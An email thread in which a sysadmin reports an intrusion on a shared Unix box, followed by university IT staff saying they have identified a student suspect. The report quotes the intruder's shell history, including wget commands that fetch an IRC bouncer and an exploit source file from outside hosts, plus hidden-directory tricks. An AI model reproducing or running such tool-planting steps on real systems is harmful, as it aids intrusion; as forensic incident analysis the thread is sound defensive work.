Subject: Re: (129.94.222.175) --- Machine with suspicious activity


We got him.

We've actually been tracking this guy for months since we suspected he was
the one that hacked our labs and got our admin accounts last year. But we
never had enough proof. But thanks to Predator (Mike? I think we know
you?), we've nailed it down.

We found the lab PC (.175) running IRC and a browser history full of
proxies and SSH clients, but no person to be seen. The account had been
logged in since about 9:30pm. As we were discussing this with our IT
Director (Geoff Gordon), the accused actually came into the lab (we knew
what he looked like from previous encounters), saw us standing around the
machine, looked a bit worried, and turned to leave. Geoff called him over,
and we had some interesting dialogue with the guy. He slipped out that he
was running bots and sharing software, but insisted it was all a 'game'. In
the end, we informed him that the PC is under investigation for a security
breach, and then let him go. It was only after we got back to the office
that we found Mike's email that pin pointed the time in which the accused
was logged on to .175, and basically proves it all beyond doubt for us. We
are currently obtaining security camera tapes to hopefully show him sitting
at the PC at the time of the event.

We've almost had him before, but I think we've got him this time. Thanks go
to Mike for an email that's got us all very excited down here in the
commerce lab technical support office!

Regards,

Subject: I\'ve been sniffed by a UNSW user! mine and rootpwd has changed



I came here to cat.org.au tonight (12:30am 26 Feb) and noticed that there
was LOTS of activity on the hub (as in, 10mbit full saturation). Conway
was hellishly busy. I logged in at the tty and noticed this login from
129.94.222.175 which resolves to somewhere in the UNSW Faculty of Commerce
and Economics, probably to quad lab 3 or 4 on the first floor.


My passwd has since been changed. Rootpwd on conway has also been changed.
chkrootkit indicates nothing (yet).


top indicated a process was eating lots of CPU and was running from my
directory. Its name was hajar. It has been installed on the 19th of Feb at
2:37am. It is accessible at:


/home/predator/   /hajar\" and is 6267 bytes long.


It\'s a binary executable. Execution permissions have now been removed and
the file frozen. The executables were compiled on Feb 19.


TCP ports open on the originating UNSW machine above are:
25, 135, 139, 161, 162, 427, 445, 593, 1025, 4444, 5000


Whoever this character is they left a lot of profile fingerprints in the
.bash_history file, segments of which are presented below with
commentaries:



  166  logout     <-me logging off
  167  w          <-him/her logged on, looking around
  168  ps x       <- I never do ps x, always ps aux
  169  w
  170  df -h
  171  whoami
  172  mkdir
  173  mkdir \"   \"  <--getting sneaky
  174  cd \"   \"
  175  wget http://www.psychoid.lam3rz.de/psyBNC2.3.1.tar.gz
  176  tar zxvf psyBNC2.3.1.tar.gz
  177  cd psybnc


psyBNC is an mIRC bouncer, whatever that is (a relay?)


Now this is interesting. I can\'t find a symlink but slocate finds psybnc
unpacked in /home/catskills/.../psybnc ... la -lurt indicates fairly
recent usage of most of it. This has also had x permissions removed
and has been frozen too. Also note the username permissions... cam??

See also /home/catskills/.../tare for (not listed here) a load of trawled
IP numbers. Anyway the dude gets the tarball and compiles the contents


  178  ls -al
  179  make menuconfig
  180  make menuconf/
  181  make menuconf
  182  make menuconfig
  183  cd ..
  184  cd ..
  185  ls
  186  ls -al
  187  cd \"   \"
  188  ls -al


Then removes the directory and the tarball itself


  189  rm psybnc
  190  rm -rf psybnc
  191  rm psyBNC2.3.1.tar.gz
  192  wget http://www.geocities.com/cafetaiwan/tembak.c


Interestingly enough this is still there. It\'s a text file, with C code in
it. Here it is. Looking at the variable names whoever wrote it is
linguistically fluent with Indonesian.

They wrote it in July of 2002... or downloaded it to their directory in
2002. Lots of other uh... interesting tools there. Anyway, what the dude
does with his/her freshly compiled tool (note: probably doing CS, knows
how to use gcc compiler) is go launch attacks on other machines with
it. And read my mail. It\'s an exploit.

Access dates (time/datestamp on conway is accurate) of interest from this
UNSW terminal are :



predator pts/4        129.94.222.175   Thu Feb 26 00:26 - 00:43  (00:16)
(this morning, I chopped their session off at 00:43)


predator pts/0        129.94.222.175   Sat Feb 21 13:29 - 13:47  (00:18)
predator pts/0        129.94.222.175   Fri Feb 20 16:41 - 16:59  (00:18)

predator pts/1        129.94.222.175   Thu Feb 19 18:56 - 21:24  (02:27)


and... check out those timestamps! Whoever they are has after-hours and
weekend access... possibly remotely.


I think it\'s reasonable to assume that whoever is/was doing this will show
up today (thurs, 26 Feb) and sit down at exactly the same machine, and
attempt to log in (which will show in our logs) to figure out why their
remotely installed IRC relay (?) isn\'t working any more. It\'s also likely
that whoever they are, they obtained my username/password via, say, a
sniffer which remains installed on the UNSW machine in question (to which
they return many times). Maybe they saw me type it in, which suggests a
student of GENC5001. Maybe, their name is Hajar (not super-likely but
anyway).  Additionally it\'s likely whoever this is, is not only attacking
my system. In any case, all these other places they attack are probably
going to have UNSW IP numbers showing up in their logs as well as our IP
numbers.


Anyway, its 3:30 am and I need sleep now. If other geeks want to poke
around and suss out the system, you have my encouragement.


-------


Thanks Tim. I\'ll be away from the terminal for a while, but I should be
able to answer further questions later. If you have specific logfiles you
want to look at, name \'em and I\'ll send \'em off.



Cheeries...
